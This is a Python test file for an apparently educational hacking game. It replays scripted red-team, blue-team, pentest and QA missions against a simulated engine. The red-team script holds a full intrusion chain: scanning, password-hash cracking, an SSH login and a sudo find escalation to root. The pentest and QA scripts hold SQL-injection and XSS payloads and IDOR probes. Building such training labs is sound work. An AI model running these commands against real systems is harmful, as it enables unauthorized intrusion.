"""Recorre cada misión de principio a fin con los comandos esperados."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.game.engine import new_state, run_line, strip_colors  # noqa: E402
from app.game.missions import MISSIONS  # noqa: E402

# Las 4 misiones originales ahora son el nivel 4 de cada rol.
L4 = {"red": "red-espejo", "blue": "blue-turno", "pentest": "pentest-volt", "qa": "qa-pagaya"}

T = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOjEwMDF9.qa-test-1001"

PLAYTHROUGHS = {
    "red": [
        "cat ~/mision/reglas.txt",
        "nmap -sn 10.13.37.0/24",
        "nmap -sV -sC -T2 10.13.37.20",
        "ftp 10.13.37.20", "ls", "get hash_backup.txt", "bye",
        "john --wordlist=/usr/share/wordlists/rockyou.txt hash_backup.txt",
        "ssh dperez@10.13.37.20", "verano2019",
        "sudo -l",
        "sudo find . -exec /bin/sh \\; -quit",
        "cat /root/flag.txt",
        "entregar FLAG{nu11_s3ct0r_0wn5_h3l1x}",
    ],
    "blue": [
        "@15",
        "grep \"Failed password\" /var/log/auth.log | tail -n 3",
        "iptables -A INPUT -s 185.220.101.47 -j DROP",
        "@30",
        "ps aux",
        "kill 4242",
        "kill -9 4242",
        "@45",
        "ps aux",
        "crontab -l -u www-data",
        "crontab -r -u www-data",
        "kill -9 5120",
        "@60",
        "grep cmd= /var/log/apache2/access.log",
        "rm /var/www/html/uploads/avatar_7731.php",
        "iptables -A INPUT -s 91.240.118.172 -j DROP",
        "incidente cerrar",
    ],
    "pentest": [
        "cat ~/contrato/alcance.txt",
        "whatweb http://10.20.0.10",
        "gobuster dir -u http://10.20.0.10 -w /usr/share/wordlists/dirb/common.txt",
        "curl http://10.20.0.10/.git/config",
        "curl \"http://10.20.0.10/producto.php?id=1'\"",
        "sqlmap -u \"http://10.20.0.10/producto.php?id=1\" --dbs",
        "curl \"http://10.20.0.10/buscar.php?q=<script>alert(1)</script>\"",
        "reporte agregar sqli alta",
        "reporte agregar xss media",
        "reporte agregar exposicion alta",
        "reporte enviar",
        "reporte agregar sqli critica",
        "reporte enviar",
    ],
    "qa": [
        "cat ~/plan_pruebas.txt",
        f"curl -H \"Authorization: Bearer {T}\" http://10.30.0.15/api/v1/users/me | jq",
        f"curl -H \"Authorization: Bearer {T}\" http://10.30.0.15/api/v1/users/1002",
        f"curl -X POST -H \"Authorization: Bearer {T}\" -d '{{\"to\":1002,\"amount\":-500}}' http://10.30.0.15/api/v1/transfers",
        "loadtest -n 200 -m POST http://10.30.0.15/api/v1/login",
        f"curl -H \"Authorization: Bearer {T}\" http://10.30.0.15/api/v1/users/abc",
        "bug nuevo idor critica", "bug nuevo validacion critica", "bug nuevo ratelimit media", "bug nuevo errores media",
        "bug enviar",
    ],
}


def play(role, verbose=False):
    m = MISSIONS[L4[role]]
    s = new_state(m)
    t0 = s["started"]
    now = t0
    for line in PLAYTHROUGHS[role]:
        if line.startswith("@"):
            now = t0 + int(line[1:])
            continue
        now += 1
        ctx = run_line(m, s, line, now=now)
        if verbose:
            print(f"$ {line}")
            for o in ctx.out:
                print("   " + strip_colors(o))
            for e in ctx.events:
                print(f"   >> EVENT [{e['severity']}] {e['title']}")
    return s


def test_all():
    for role in PLAYTHROUGHS:
        s = play(role)
        assert s["status"] == "completed", (role, s["status"], list(s["done"]))


def test_help_and_basics():
    for role in PLAYTHROUGHS:
        m = MISSIONS[L4[role]]
        s = new_state(m)
        for line in ("help", "objetivos", "pista", "aprende sqli", "ls -la", "cd /", "ls", "pwd", "foo", "cat noexiste | grep x"):
            run_line(m, s, line)
        assert s["score"] == 0


def test_red_noise_fail():
    m = MISSIONS["red-espejo"]
    s = new_state(m)
    for _ in range(4):
        run_line(m, s, "nmap -A -p- -T5 10.13.37.0/24")
    assert s["status"] == "failed"


def test_blue_timeout_penalty():
    m = MISSIONS["blue-turno"]
    s = new_state(m)
    run_line(m, s, "help", now=s["started"] + 11)
    run_line(m, s, "help", now=s["started"] + 200)
    assert s["meter"] == 70


def test_qa_countdown():
    m = MISSIONS["qa-pagaya"]
    s = new_state(m)
    run_line(m, s, "help", now=s["started"] + 1300)
    assert s["status"] == "failed"


if __name__ == "__main__":
    for role in PLAYTHROUGHS:
        print(f"\n================ {role} ================")
        s = play(role, verbose="-v" in sys.argv)
        print(role, s["status"], s["score"], s.get("meter"))
    test_help_and_basics()
    test_red_noise_fail()
    test_blue_timeout_penalty()
    test_qa_countdown()
    print("OK")
